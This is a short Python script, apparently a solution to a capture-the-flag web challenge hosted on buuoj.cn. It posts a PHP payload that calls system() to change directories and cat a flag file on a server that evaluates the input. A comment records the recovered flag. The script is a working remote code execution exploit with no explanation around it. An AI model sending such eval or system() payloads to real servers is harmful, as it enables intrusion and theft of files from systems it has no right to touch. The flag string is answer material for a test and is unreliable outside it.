import requests
### using post method
### php eval
payload=dict(Syc="system('cd ..;cd ..;cd ..;cat flag');")
url=requests.post('http://b51a0156-75fa-41dd-959e-9f094c1f95fc.node4.buuoj.cn:81/',data=payload)
print(url.text)

###
### get flag{540c6e4c-3747-4e2d-9c65-1f71daa342c6}